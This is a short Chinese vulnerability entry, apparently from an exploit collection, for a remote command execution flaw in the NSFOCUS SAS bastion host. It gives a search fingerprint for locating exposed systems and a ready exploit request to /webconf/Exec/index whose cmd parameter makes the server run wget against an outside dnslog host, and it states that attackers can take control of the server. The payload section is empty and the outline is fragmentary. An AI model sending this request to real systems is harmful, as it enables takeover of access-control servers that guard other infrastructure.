# 绿盟SAS堡垒机Exec远程命令执行漏洞

- **系统**：绿盟SAS堡垒机Exec　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app.name="NSFOCUS 绿盟 SAS"`
- **请求**：`GET /webconf/Exec/index?cmd=wget%200nicnk.dnslog.cn HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```

```

**其他**
- 绿盟 SAS堡垒机 Exec 远程命令执行漏洞: * 一、漏洞执行
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 漏洞执行: 绿盟 SAS堡垒机 Exec 远程命令执行漏洞，攻击者可通过该漏洞获取服务器控制权限。
- 版本: * 绿盟SAS堡垒机